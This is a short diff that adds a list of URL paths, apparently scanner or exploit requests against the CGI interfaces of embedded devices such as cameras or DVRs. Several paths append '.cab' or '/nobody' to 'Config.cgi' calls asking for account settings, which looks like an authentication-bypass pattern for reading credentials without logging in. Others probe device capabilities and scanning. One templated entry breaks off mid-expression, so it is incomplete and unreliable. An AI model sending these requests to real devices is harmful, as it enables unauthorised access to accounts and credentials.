@@ -1,0 +1,9 @@
+/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
+/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
+/cgi-bin/cgibox?.cab
+/cgi-bin/cgibox?/nobody
+/index.html
+/gateway
+/cgi-bin/nobody/VerifyCode.cgi?account={{base64(username + 
+/cgi-bin/nobody/Machine.cgi?action=get_capability
+/cgi-bin/nobody/Search.cgi?action=scan
